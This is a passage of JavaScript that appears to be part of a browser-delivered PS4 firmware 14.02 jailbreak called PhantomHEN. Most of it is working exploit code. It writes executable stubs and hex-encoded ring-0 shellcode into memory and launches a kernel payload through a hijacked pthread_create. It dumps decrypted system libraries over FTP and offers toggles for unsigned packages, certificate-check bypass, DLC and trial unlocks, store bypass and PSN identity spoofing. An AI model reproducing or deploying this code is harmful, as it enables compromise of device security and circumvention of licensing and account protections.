    say("[PhantomHEN] custom HEN detected — skipping legacy patch pass");
    shnOffset = 0;
    return image;
  }
  const off = isCurrent ? 0x2000 : 0;
  shnOffset = off;
  if (d.getUint16(0x47754 + off, true) !== 1402 ||
      d.getUint16(0x47a04 + off, true) !== 1 || d.getUint16(0x47a06 + off, true) !== 32)
    throw new Error("Unsupported PhantomHEN configuration");
  const compressed = d.getUint32(0x4706c + off, true);
  const elfSize = d.getUint32(0x47a10 + off, true);
  if (compressed < 6 || compressed > 0x48000 || !elfSize || elfSize > 0x100000)
    throw new Error("PhantomHEN image sizes are invalid");
  // Honor the binary's startup configuration. The default includes the
  // shell patches needed by Debug Settings and starts the native menu.
  let flags = d.getUint32(0x47a08 + off, true);
  const profiles = { full: 0x7f, minimal: 0x30, debug: 0x32 };
  const services = { ftp: 1, klog: 2, payloader: 4, menu: 8, shell: 16, notify: 32, preload: 64 };
  if (params && params.get("shnprofile")) {
    const profile = params.get("shnprofile");
    if (!Object.prototype.hasOwnProperty.call(profiles, profile))
      throw new Error("Unknown PhantomHEN profile");
    flags = profiles[profile];
  }
  if (params && params.get("shndisable")) {
    params.get("shndisable").split(",").forEach(function (name) {
      if (!Object.prototype.hasOwnProperty.call(services, name))
        throw new Error("Unknown PhantomHEN service: " + name);
      flags &= ~services[name];
    });
  }
  if (flags & ~0x7f) throw new Error("Unknown PhantomHEN options");
  d.setUint32(0x47a08 + off, flags, true);
  const controls = [["shnattempts", 0x47a0c + off, 1, 60], ["shndelay", 0x47a0e + off, 0, 5000],
                    ["shnstop", 0x47756 + off, 0, 13]];
  controls.forEach(function (item) {
    const raw = params && params.get(item[0]);
    const value = raw === null || raw === undefined ? d.getUint16(item[1], true) : Number(raw);
    if (!Number.isInteger(value) || value < item[2] || value > item[3] ||
        (item[0] === "shnstop" && value === 1))
      throw new Error("Invalid PhantomHEN " + item[0]);
    d.setUint16(item[1], value, true);
  });
  d.setUint32(0x47000 + off, 0, true);
  d.setUint32(0x47004 + off, 0, true);
  /* Host address for the payload's klog stream (UDP 3232, one line per
     datagram).  A non-dotted hostname leaves both words zero and the payload
     skips the stream. */
  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(location.hostname);
  const oct = m ? m.slice(1).map(Number) : [];
  const ip = oct.length === 4 && oct.every(function (n) { return n <= 255; })
    ? (oct[0] | (oct[1] << 8) | (oct[2] << 16) | (oct[3] << 24)) >>> 0
    : 0;
  d.setUint32(0x47a14 + off, ip, true);
  d.setUint16(0x47a18 + off, 3232, true);
  say("[PhantomHEN] 14.02 startup options 0x" + flags.toString(16));
  return image;
}

// ---------------------------------------------------------------------------
// HEN Settings panel — shown after PhantomHEN loads (stage 13/64)
// Calls the custom syscall 0xc9 (settings_syscall_handler) installed by HEN.
// All cases use pointer-to-value convention: param_2[0]=caseNum, param_2[1]=&value.
// ---------------------------------------------------------------------------

function ensureSettingStub() {
  if (STATE.stubs[0xc9]) return true;
  const r = sc(S.mmap, 0, 0x1000, 7, 0x1002, -1, 0);
  if (r.i32 === -1) { say("[settings] mmap for syscall stub failed"); return false; }
  const p = v(r.lo, r.hi);
  // mov eax, 0xc9; syscall; ret
  const bytes = [0xb8, 0xc9, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3];
  for (let i = 0; i < bytes.length; i++) wr1(plus(p, i), bytes[i]);
  STATE.stubs[0xc9] = p;
  return true;
}

function setSetting(caseNum, value) {
  if (!ensureSettingStub()) return;
  const vb = alloc(8);
  vb.u32[0] = value >>> 0;
  vb.u32[1] = 0;
  try { sc(0xc9, caseNum, vb.at); } catch (e) { say("[settings] sc error case " + caseNum + ": " + e); }
}

/* ── in-page settings panel ── */
const LS_KEY = "phen_settings";
function phenLoadAll(){try{return JSON.parse(localStorage.getItem(LS_KEY)||"{}");}catch(e){return{};}}
function phenPersist(id,val){try{var s=phenLoadAll();s[id]=val;localStorage.setItem(LS_KEY,JSON.stringify(s));}catch(e){}}
function phenStored(id){try{var s=phenLoadAll();return id in s?s[id]:null;}catch(e){return null;}}

function phenToast(name,val,type){
  var wrap=document.getElementById("phen-toast-wrap");
  if(!wrap){wrap=document.createElement("div");wrap.id="phen-toast-wrap";
    wrap.style.cssText="position:fixed;bottom:24px;right:20px;display:flex;flex-direction:column-reverse;gap:8px;z-index:999999;pointer-events:none";
    document.body.appendChild(wrap);}
  var t=document.createElement("div");
  t.style.cssText="background:#111;border:1px solid #1a3a4a;color:#e0e0e0;font-size:12px;padding:9px 14px;border-radius:6px;display:flex;align-items:center;gap:8px;min-width:200px;max-width:300px;opacity:0;transform:translateX(20px);transition:opacity .2s,transform .2s";
  var dotColor=type==="toggle"?(val?"#00c060":"#cc0000"):"#0080c0";
  var label=type==="toggle"?("<b>"+(val?"ON":"OFF")+"</b>"):("<b>"+val+"</b>");
  t.innerHTML='<span style="width:7px;height:7px;border-radius:50%;background:'+dotColor+';flex-shrink:0;display:inline-block"></span>'+name+": "+label;
  wrap.appendChild(t);
  requestAnimationFrame(function(){requestAnimationFrame(function(){t.style.opacity="1";t.style.transform="translateX(0)";});});
  setTimeout(function(){t.style.opacity="0";t.style.transform="translateX(20px)";setTimeout(function(){if(t.parentNode)t.parentNode.removeChild(t);},250);},2500);
}

const PHEN_SECTIONS = [
  {label:"Network & Remote",items:[
    {id:11,name:"FTP Server",def:1,type:"toggle"},
    {id:12,name:"FTP Anonymous",def:0,type:"toggle"},
    {id:13,name:"FTP Port",def:2121,type:"number",min:1,max:65535},
    {id:14,name:"Remote Play",def:0,type:"toggle"},
    {id:15,name:"PSN Patch",def:0,type:"toggle"},
    {id:16,name:"LAN Play",def:0,type:"toggle"},
  ]},
  {label:"PKG & Install",items:[
    {id:46,name:"Fake PKG",def:1,type:"toggle"},
    {id:47,name:"No Cert Check",def:1,type:"toggle"},
    {id:48,name:"Allow All PKG",def:1,type:"toggle"},
    {id:52,name:"Unsigned PKG",def:1,type:"toggle"},
    {id:50,name:"Region Bypass",def:0,type:"toggle"},
    {id:49,name:"NP Env Spoof",def:0,type:"toggle"},
  ]},
  {label:"Games & Saves",items:[
    {id:36,name:"Disc Bypass",def:1,type:"toggle"},
    {id:30,name:"Cheats",def:0,type:"toggle"},
    {id:31,name:"Trainers",def:0,type:"toggle"},
    {id:32,name:"Trophy Lock",def:0,type:"toggle"},
    {id:34,name:"Save Backup",def:0,type:"toggle"},
    {id:35,name:"Save Resign",def:0,type:"toggle"},
    {id:37,name:"Remote PKG",def:0,type:"toggle"},
    {id:83,name:"Game Patch Bypass",def:0,type:"toggle"},
    {id:84,name:"Trial Unlock",def:0,type:"toggle"},
    {id:86,name:"DLC Unlock",def:0,type:"toggle"},
    {id:91,name:"Block Auto Update",def:0,type:"toggle"},
    {id:93,name:"Force 60FPS",def:0,type:"toggle"},
    {id:94,name:"Skip Intros",def:0,type:"toggle"},
  ]},
  {label:"Plugins",items:[
    {id:38,name:"Plugins Enabled",def:1,type:"toggle"},
    {id:42,name:"Allow Unsigned PRX",def:0,type:"toggle"},
    {id:39,name:"Plugin Log",def:0,type:"toggle"},
    {id:40,name:"Plugin Error Notify",def:0,type:"toggle"},
  ]},
  {label:"System Tweaks",items:[
    {id:17,name:"Disable HDCP",def:0,type:"toggle"},
    {id:18,name:"Suspend Patch",def:0,type:"toggle"},
    {id:19,name:"Sysver Spoof",def:0,type:"toggle"},
    {id:"19t",name:"Spoof Version",def:"09.00",type:"text",placeholder:"e.g. 09.00"},
    {id:21,name:"Safe Mode Patch",def:0,type:"toggle"},
    {id:22,name:"Poke Patch",def:0,type:"toggle"},
    {id:24,name:"Boost Mode",def:0,type:"toggle"},
    {id:45,name:"RGB Full Range",def:0,type:"toggle"},
    {id:44,name:"Force Resolution",def:0,type:"select",opts:[
      {label:"Default",val:0},{label:"720p",val:1},{label:"1080p",val:2},{label:"4K",val:3}
    ]},
  ]},
  {label:"PSN",items:[
    {id:53,name:"PSN Offline",def:0,type:"toggle"},
    {id:54,name:"NAT Spoof",def:0,type:"toggle"},
    {id:55,name:"Trophy Bypass",def:0,type:"toggle"},
    {id:57,name:"Store Bypass",def:0,type:"toggle"},
    {id:58,name:"Online ID Spoof",def:0,type:"toggle"},
    {id:"58t",name:"Spoofed ID",def:"",type:"text",placeholder:"fake PSN name"},
  ]},
  {label:"Display & UI",items:[
    {id:61,name:"Notify Style",def:0,type:"select",opts:[
      {label:"Default",val:0},{label:"Minimal",val:1},{label:"Large",val:2},{label:"Off",val:3}
    ]},
    {id:67,name:"Notify Duration",def:5,type:"number",min:1,max:30,unit:"s"},
    {id:63,name:"Clock 24h",def:0,type:"toggle"},
    {id:64,name:"Show Battery %",def:0,type:"toggle"},
    {id:71,name:"Show FPS",def:0,type:"toggle"},
    {id:72,name:"Show CPU Temp",def:0,type:"toggle"},
    {id:68,name:"Disable Popups",def:0,type:"toggle"},
    {id:70,name:"Menu Alpha",def:85,type:"range",min:0,max:100,unit:"%"},
  ]},
  {label:"System Extended",items:[
    {id:96,name:"Fast Boot",def:0,type:"toggle"},
    {id:100,name:"USB Storage",def:0,type:"toggle"},
    {id:101,name:"BD Drive Bypass",def:0,type:"toggle"},
    {id:104,name:"Recovery Patch",def:0,type:"toggle"},
    {id:107,name:"Safe App Bypass",def:1,type:"toggle"},
    {id:108,name:"Emergency Bypass",def:0,type:"toggle"},
  ]},
  {label:"Debug",items:[
    {id:73,name:"Kernel Debug Log",def:0,type:"toggle"},
    {id:74,name:"Debug Overlay",def:0,type:"toggle"},
    {id:75,name:"Core Dump",def:0,type:"toggle"},
    {id:77,name:"Net Debug Log",def:0,type:"toggle"},
    {id:79,name:"Memory Debug",def:0,type:"toggle"},
    {id:81,name:"Crash Report",def:0,type:"toggle"},
  ]},
];

function makePhenCtrl(item){
  if(item.type==="toggle"){
    var w=document.createElement("label");w.className="phen-tog";
    var i=document.createElement("input");i.type="checkbox";i.id="phen-t-"+item.id;
    var sv=phenStored(item.id);i.checked=sv!==null?!!sv:!!item.def;
    var sl=document.createElement("span");sl.className="phen-sl";
    i.onchange=(function(it){return function(){
      phenPersist(it.id,this.checked?1:0);
      setSetting(it.id,this.checked?1:0);
      phenToast(it.name,this.checked,"toggle");
    };})(item);
    w.appendChild(i);w.appendChild(sl);return w;
  }
  if(item.type==="number"){
    var i=document.createElement("input");i.type="number";i.className="phen-num";
    i.min=item.min||0;i.max=item.max||9999;i.step=1;
    var sv=phenStored(item.id);i.value=sv!==null?sv:item.def;
    i.onchange=(function(it){return function(){
      var v=Math.min(Math.max(parseInt(this.value)||it.def,it.min||0),it.max||9999);
      this.value=v;phenPersist(it.id,v);setSetting(it.id,v);
      phenToast(it.name,v+(it.unit||""),"value");
    };})(item);
    return i;
  }
  if(item.type==="select"){
    var s=document.createElement("select");s.className="phen-sel";
    var sv=phenStored(item.id);var cur=sv!==null?sv:item.def;
    (item.opts||[]).forEach(function(o){
      var opt=document.createElement("option");opt.value=o.val;opt.textContent=o.label;
      if(cur==o.val)opt.selected=true;s.appendChild(opt);
    });
    s.onchange=(function(it){return function(){
      var v=parseInt(this.value);phenPersist(it.id,v);setSetting(it.id,v);
      phenToast(it.name,this.options[this.selectedIndex].text,"value");
    };})(item);
    return s;
  }
  if(item.type==="text"){
    var i=document.createElement("input");i.type="text";i.className="phen-txt";
    i.placeholder=item.placeholder||"";
    var sv=phenStored(item.id);i.value=sv!==null?sv:(item.def||"");
    i.onchange=(function(it){return function(){
      phenPersist(it.id,this.value);
      phenToast(it.name,this.value||"(cleared)","value");
    };})(item);
    return i;
  }
  if(item.type==="range"){
    var w=document.createElement("div");w.style.cssText="display:flex;align-items:center;gap:6px;flex-shrink:0";
    var r=document.createElement("input");r.type="range";r.className="phen-range";
    r.min=item.min||0;r.max=item.max||100;r.step=1;
    var sv=phenStored(item.id);r.value=sv!==null?sv:item.def;
    var lv=document.createElement("span");lv.style.cssText="font-size:11px;color:#888;width:34px;text-align:right";
    lv.textContent=r.value+(item.unit||"");
    r.oninput=function(){lv.textContent=this.value+(item.unit||"");};
    r.onchange=(function(it,l){return function(){
      l.textContent=this.value+(it.unit||"");
      var v=parseInt(this.value);phenPersist(it.id,v);setSetting(it.id,v);
      phenToast(it.name,this.value+(it.unit||""),"value");
    };})(item,lv);
    w.appendChild(r);w.appendChild(lv);return w;
  }
  return null;
}

function showSettingsPanel() {
  if(document.getElementById("phen-panel")){document.getElementById("phen-panel").remove();}
  var existing=document.getElementById("phen-style");if(existing)existing.remove();

  var style=document.createElement("style");style.id="phen-style";
  style.textContent=[
    "#phen-panel{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.93);z-index:99999;overflow-y:auto;box-sizing:border-box;padding:60px 20px 40px;font-family:sans-serif;color:#e0e0e0}",
    "#phen-panel h2{margin:0 0 4px;font-size:20px;color:#00c0ff;letter-spacing:1px}",
    "#phen-panel .sub{font-size:11px;color:#888;margin-bottom:18px}",
    "#phen-panel .phen-sections{display:grid;grid-template-columns:1fr;gap:0 32px}",
    "@media(min-width:600px){#phen-panel .phen-sections{grid-template-columns:1fr 1fr}}",
    "#phen-panel .psec{margin-bottom:20px}",
    "#phen-panel .psec-title{font-size:10px;text-transform:uppercase;letter-spacing:2px;color:#00c0ff;border-bottom:1px solid #1a3a4a;padding-bottom:4px;margin-bottom:8px}",
    "#phen-panel .prow{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid #111;gap:8px}",
    "#phen-panel .prow:last-child{border-bottom:none}",
    "#phen-panel .prow .prl{font-size:13px;flex:1;min-width:0}",
    "#phen-panel .phen-tog{position:relative;width:40px;height:22px;flex-shrink:0}",
    "#phen-panel .phen-tog input{opacity:0;width:0;height:0}",
    "#phen-panel .phen-sl{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:#333;border-radius:11px;transition:.2s}",
    "#phen-panel .phen-sl:before{position:absolute;content:'';height:16px;width:16px;left:3px;bottom:3px;background:#888;border-radius:50%;transition:.2s}",
    "#phen-panel .phen-tog input:checked+.phen-sl{background:#0080c0}",
    "#phen-panel .phen-tog input:checked+.phen-sl:before{transform:translateX(18px);background:#fff}",
    "#phen-panel .phen-num,.phen-txt{background:#111;border:1px solid #1a3a4a;color:#e0e0e0;padding:4px 8px;font-family:'Courier New',monospace;font-size:12px;border-radius:4px;width:88px;text-align:right;outline:none}",
    "#phen-panel .phen-txt{text-align:left;width:120px}",
    "#phen-panel .phen-sel{background:#111;border:1px solid #1a3a4a;color:#e0e0e0;padding:4px 6px;font-size:12px;border-radius:4px;outline:none;cursor:pointer;max-width:130px}",
    "#phen-panel .phen-range{-webkit-appearance:none;width:90px;height:4px;background:#333;border-radius:2px;outline:none;cursor:pointer}",
    "#phen-panel .phen-range::-webkit-slider-thumb{-webkit-appearance:none;width:14px;height:14px;border-radius:50%;background:#0080c0;cursor:pointer}",
    "#phen-close{position:fixed;top:14px;right:14px;background:#1a1a1a;border:1px solid #cc0000;color:#fff;font-size:13px;padding:6px 14px;border-radius:4px;cursor:pointer;z-index:100000;font-family:'Courier New',monospace;letter-spacing:.08em}",
    "#phen-settingslink{position:fixed;top:14px;left:14px;background:transparent;border:1px solid #1a3a4a;color:#00c0ff;font-size:12px;padding:6px 12px;border-radius:4px;cursor:pointer;z-index:100000;font-family:'Courier New',monospace;text-decoration:none}",
  ].join("\n");
  document.head.appendChild(style);

  var panel=document.createElement("div");panel.id="phen-panel";

  var closeBtn=document.createElement("button");closeBtn.id="phen-close";closeBtn.textContent="✕ Close";
  closeBtn.onclick=function(){panel.remove();style.remove();};
  document.body.appendChild(closeBtn);

  var extLink=document.createElement("a");extLink.id="phen-settingslink";
  extLink.href="settings.html";extLink.textContent="⬡ Full Page";
  document.body.appendChild(extLink);

  var h2=document.createElement("h2");h2.textContent="PhantomHEN Settings";panel.appendChild(h2);
  var sub=document.createElement("div");sub.className="sub";
  sub.textContent="FW 14.02 · iDntUseModz · Changes apply immediately";panel.appendChild(sub);

  var sw=document.createElement("div");sw.className="phen-sections";panel.appendChild(sw);

  PHEN_SECTIONS.forEach(function(sec){
    var div=document.createElement("div");div.className="psec";
    var t=document.createElement("div");t.className="psec-title";t.textContent=sec.label;div.appendChild(t);
    sec.items.forEach(function(item){
      var row=document.createElement("div");row.className="prow";
      var lbl=document.createElement("span");lbl.className="prl";lbl.textContent=item.name;
      row.appendChild(lbl);
      var ctrl=makePhenCtrl(item);
      if(ctrl)row.appendChild(ctrl);
      div.appendChild(row);
    });
    sw.appendChild(div);
  });

  document.body.appendChild(panel);
}

function monitorPhantomHEN(entry) {
  let last = -1, polls = 0, lastServices = "";
  const names = {
    1: "entry", 2: "kernel entry", 3: "imports ready", 7: "allocating ELF",
    8: "decompressing", 9: "validating ELF", 10: "allocating executable image",
    11: "mapping ELF", 12: "starting kernel payload", 13: "startup complete",
    32: "kernel imports", 33: "FakePKG hooks", 34: "FakeSELF hooks",
    35: "ShellCore patches", 36: "custom syscalls", 37: "kernel/shell patches",
    38: "Debug Settings patches",
    48: "kernel log", 49: "FTP", 50: "payload receiver", 51: "settings menu",
    52: "module preload", 53: "menu process", 54: "FTP init result",
    55: "FTP missing import", 56: "FTP init phase", 57: "binloader init result",
    58: "binloader missing import", 59: "binloader init phase", 64: "core ready",
    225: "firmware rejected", 226: "ELF allocation failed", 227: "decompression failed",
    228: "invalid ELF", 229: "executable allocation failed", 230: "ELF mapping failed",
    231: "kernel startup failed", 232: "invalid image configuration"
  };
  const off = shnOffset;
  const timer = setInterval(function () {
    polls++;
    const stage = rd4(plus(entry, 0x47000 + off)) >>> 0;
    const value = rd4(plus(entry, 0x47004 + off)) >>> 0;
    if ((rd4(plus(entry, 0x47008 + off)) >>> 0) === 0x31564353) {
      const details = [];
      for (let i = 0; i < 6; i++) details.push(rd4(plus(entry, 0x4700c + off + i * 4)) >>> 0);
      const signature = details.join(",");
      if (signature !== lastServices) {
        lastServices = signature;
        for (let i = 0; i < 2; i++) {
          const result = details[i * 3], missing = details[i * 3 + 1], phase = details[i * 3 + 2];
          if (!phase) continue;
          const libraries = ["libSceNet", "libSceNetCtl", "libSceLibcInternal", "libSceSysmodule"];
          const special = {65281: "sceKernelClearEventFlag", 65282: "sceKernelSetEventFlag", 65283: "sceKernelLoadStartModule"};
          const symbol = special[missing] || (missing >= 0xfe00 && missing < 0xfe04 ? libraries[missing - 0xfe00] : "offset 0x" + missing.toString(16));
          say("[PhantomHEN] " + (i ? "Binloader" : "FTP") + " result=0x" + result.toString(16) +
              " phase=" + (phase >>> 16) + " operation=" + (phase & 0xffff) +
              (missing ? " missing=" + symbol : ""));
        }
      }
    }
    if (stage !== last) {
      say("[PhantomHEN] " + (names[stage] || "stage " + stage) + " value=0x" + value.toString(16));
      last = stage;
    }
    if (stage === 13 || stage === 64 || stage >= 0xe0 || polls >= 120) {
      clearInterval(timer);
      if (stage === 13 || stage === 64) {
        say("PhantomHEN loaded — iDntUseModz");
        setSetting(11, 1);
        window.__openHENSettings = showSettingsPanel;
        /* Floating settings button — always visible after jailbreak */
        if (!document.getElementById("phen-fab")) {
          var fab = document.createElement("button");
          fab.id = "phen-fab";
          fab.textContent = "⚙ HEN Settings";
          fab.style.cssText = "position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#0a0a0a;border:1px solid #cc0000;color:#fff;padding:10px 28px;font-family:'Courier New',monospace;font-size:.85rem;letter-spacing:.12em;cursor:pointer;z-index:9998;border-radius:4px;text-shadow:0 0 6px #ff4444;box-shadow:0 0 12px #2a0000";
          fab.onclick = function () { showSettingsPanel(); };
          document.body.appendChild(fab);
        }
        showSettingsPanel();
      }
      if ((stage === 13 || stage === 64) && value)
        say("[PhantomHEN] optional startup warnings 0x" + value.toString(16));
    }
  }, 250);
}

// ---------------------------------------------------------------------------
// NP bypass SPRX dumper
// Runs after kernel escape and uid=0, before phantomhen payload thread starts.
// Loads each SPRX into the WebKit process via dynlib_load_prx (syscall 594),
// reads the decrypted segment pages through the kernel R/W primitive, then
// writes them to /data/np_bypass/ over the already-running FTP server root.
//
// PS4 dynlib_get_info layout (struct at the info buffer):
//   +0x00  int   handle
//   +0x08  char  name[256]       module name
//   +0x108 void* text_base       VA of decrypted .text segment
//   +0x110 uint  text_size
//   +0x118 void* data_base
//   +0x120 uint  data_size
//   +0x148 void* text_seg_base   (alias, same as +0x108 on most builds)
// ---------------------------------------------------------------------------
const NP_DUMP_DIR  = "/data/np_bypass";
const NP_SPRX_SRC  = [
  "/system/common/lib/libSceNpManager.sprx",
  "/system/common/lib/libSceNpToolkit.sprx",
];

// O_WRONLY|O_CREAT|O_TRUNC, mode 0644
const O_WCT   = 0x601;
const MODE644 = 0x1a4;

// SceKernelDynlibInfo is 0x200 bytes; text_base is at +0x108, text_size +0x110,
// data_base at +0x118, data_size +0x120.
const DI_SIZE      = 0x200;
const DI_TEXT_BASE = 0x108;
const DI_TEXT_SZ   = 0x110;
const DI_DATA_BASE = 0x118;
const DI_DATA_SZ   = 0x120;

function dumpNpSprxes() {
  // mkdir /data/np_bypass (ignore EEXIST)
  sc(S.mkdir_, cstr(NP_DUMP_DIR).at, MODE644);

  for (let si = 0; si < NP_SPRX_SRC.length; si++) {
    const srcPath = NP_SPRX_SRC[si];
    const name    = srcPath.slice(srcPath.lastIndexOf("/") + 1);
    const dstPath = NP_DUMP_DIR + "/" + name;

    say("[np-dump] loading " + srcPath);

    // Allocate output slot for the module handle (int, 4 bytes)
    const hBuf = alloc(4);
    hBuf.u8.fill(0);

    // dynlib_load_prx(path, 0, NULL, 0, NULL, &handle)
    // arg order: path, argSize, args, flags, opt, pHandle
    const rv = sc(S.dynlib_load_prx,
      cstr(srcPath).at,  // path
      0,                 // argSize
      0,                 // args (NULL)
      0,                 // flags
      0,                 // opt (NULL)
      hBuf.at            // &handle out
    ).i32;

    if (rv !== 0) {
      say("[np-dump] dynlib_load_prx(" + srcPath + ") failed rv=0x" + (rv >>> 0).toString(16));
      continue;
    }

    const handle = hBuf.dv.getInt32(0, true);
    say("[np-dump] " + name + " loaded, handle=" + handle);

    // Query segment info
    const info = alloc(DI_SIZE);
    info.u8.fill(0);
    const qi = sc(S.dynlib_get_info, handle, info.at).i32;
    if (qi !== 0) {
      say("[np-dump] dynlib_get_info failed rv=0x" + (qi >>> 0).toString(16));
      sc(S.dynlib_unload_prx, handle);
      continue;
    }

    // Read text_base, text_size, data_base, data_size from the info struct
    // These are 64-bit VAs stored little-endian in the alloc buffer.
    // We use p.read to pull them since they're in our own process's user VA.
    const c = host();
    function readInfoU64(off) {
      const lo = info.dv.getUint32(off,     true) >>> 0;
      const hi = info.dv.getUint32(off + 4, true) >>> 0;
      return v(lo, hi);
    }
    function readInfoU32(off) {
      return info.dv.getUint32(off, true) >>> 0;
    }

    const textBase = readInfoU64(DI_TEXT_BASE);
    const textSize = readInfoU32(DI_TEXT_SZ);
    const dataBase = readInfoU64(DI_DATA_BASE);
    const dataSize = readInfoU32(DI_DATA_SZ);

    say("[np-dump] " + name +
        " text 0x" + textSize.toString(16) + " @ 0x" + textBase.hi.toString(16) +
        " data 0x" + dataSize.toString(16) + " @ 0x" + dataBase.hi.toString(16));

    if (!textBase.hi && !textBase.low) {
      say("[np-dump] text_base is null, skipping " + name);
      sc(S.dynlib_unload_prx, handle);
      continue;
    }

    // Open destination file
    const dstFd = sc(S.open, cstr(dstPath).at, O_WCT, MODE644).i32;
    if (dstFd < 0) {
      say("[np-dump] open(" + dstPath + ") failed fd=" + dstFd + " errno=" + c.errno());
      sc(S.dynlib_unload_prx, handle);
      continue;
    }

    // Dump text segment via kernel read primitive, write in 0x8000-byte chunks
    const CHUNK = 0x8000;
    let wrote = 0;
    let ok = true;

    function dumpSegment(base, size) {
      if (!size || (!base.hi && !base.low)) return true;
      let off = 0;
      while (off < size) {
        const n = Math.min(CHUNK, size - off);
        const seg = c.p.read(plus(base, off), n);
        if (!seg || !seg.length) {
          say("[np-dump] read stalled at 0x" + off.toString(16));
          return false;
        }
        // write() syscall: write(fd, buf, nbytes)
        // We write from a fresh alloc so the pointer is in our mapped arena.
        const wbuf = alloc(n);
        wbuf.u8.set(seg, 0);
        const wn = sc(S.write, dstFd, wbuf.at, n).i32;
        if (wn < 0) {
          say("[np-dump] write failed errno=" + c.errno());
          return false;
        }
        wrote += wn;
        off   += n;
      }
      return true;
    }

    ok = dumpSegment(textBase, textSize);
    if (ok && dataSize > 0) ok = dumpSegment(dataBase, dataSize);

    sc(S.close, dstFd);
    sc(S.dynlib_unload_prx, handle);

    if (ok) {
      say("[np-dump] wrote " + wrote + " bytes -> " + dstPath + "  (FTP: np_bypass/" + name + ")");
    } else {
      say("[np-dump] partial dump at " + wrote + " bytes for " + name);
    }
  }
}

async function loadPayload(url, vorab, room) {
  const c = host();
  if (!isPhantomHEN(vorab)) {
    say("[p] " + url + " is not our PhantomHEN image -- refusing");
    return false;
  }
  if (c.state && c.state.fw && c.state.fw !== "14.02") {
    say("[p] This rebuilt payload requires PS4 14.02");
    return false;
  }
  const blob = configurePhantomHEN(vorab);
  if (!runPatchSet(room)) return false;

  // NP SPRX dump -- runPatchSet() just applied the SELF auth bypass patches.
  // dynlib_load_prx on /system/ paths requires those patches; calling before
  // this point returns EPERM (rv=0xffffffff).
  if (!(c.params && c.params.get("nodump") === "1")) {
    say("[np-dump] starting NP SPRX dump to " + NP_DUMP_DIR);
    try {
      dumpNpSprxes();
    } catch (dumpErr) {
      say("[np-dump] exception: " + (dumpErr && dumpErr.message));
    }
    say("[np-dump] done -- connect FileZilla after HEN starts, check /np_bypass/");
  }

  if (c.params && c.params.get("shnhost") === "0") {
    say("[p] thread start skipped by shnhost=0 -- patchset applied, nothing started");
    return false;
  }
  const size = (blob.length + 0x3fff) & ~0x3fff;
  const m = sc(S.mmap, 0, size, 3, 0x1002, -1, 0);
  const entry = v(m.lo, m.hi);
  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
    say("[p] mmap failed, errno " + c.errno()); return false;
  }

  for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
  if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
    say("[p] mprotect rwx failed, errno " + c.errno()); return false;
  }
  codeAt(entry, 0).hex("c3");
  const probe = c.callAddr(entry, []);
  if (probe === undefined || probe === null) {
    say("[p] entry page does not execute in ring 3 -- stopping"); return false;
  }
  say("[p] entry page executes in ring 3, loading payload");

  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
  }
  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    const q = c.p.read8(plus(entry, o));
    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
    }
  }
  say("[p] payload copied and verified, starting thread");

  const SLOT_1352 = 0x3cb9c00;
  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
    ? c.off.wk___imp_pthread_create : SLOT_1352;
  if (!c.webkitBase || !c.libkernelBase) {
    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
    return false;
  }
  const fnr = c.p.read8(c.webkitBase.add32(slot));
  const fn = v(fnr.low, fnr.hi);
  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
    return false;
  }
  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));

  const thr = alloc(8);
  thr.u8.fill(0);
  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
  const handle = qAt(thr, 0);
  const started = rc === 0 && (handle.hi >>> 0) > 0;
  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
      + (started ? " -- running" : " -- did NOT start"));
  if (started) monitorPhantomHEN(entry);
  return started;
}

const PADDING = 0x0b3a300;
const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
const RET0 = 0x00c3c031;

function rehangRing0(k, room, ofs, list, from, copy) {
  if (!list.length || list.length > 256 || !from) return null;
  for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
  const c = k.begin();
  c.hex("31c0");
  c.hex("48be").qw(plus(room, STAGE));
  c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);
  c.hex("49b9").qw(from);
  c.hex("49ba").qw(copy);
  c.hex("4885c9").hex("7421").hex("486316").hex("4883c604").hex("48ffc9");
  c.hex("4d8b1cd0").hex("4d85db").hex("74e8").hex("4d394b08").hex("75e2");
  c.hex("4d895308").hex("ffc0").hex("ebda");
  c.hex("48ba").qw(plus(room, OUT)).hex("488902");
  if (!k.run()) return null;
  return rd4(plus(room, OUT));
}

function countOffRing0(k, room, ofs, list, copy) {
  if (!list.length || list.length > 256) return null;
  for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
  const c = k.begin();
  c.hex("31c0");
  c.hex("48be").qw(plus(room, STAGE));
  c.hex("48b9").qw(splitNum(list.length));
  c.hex("49b8").qw(ofs);
  c.hex("49ba").qw(copy);
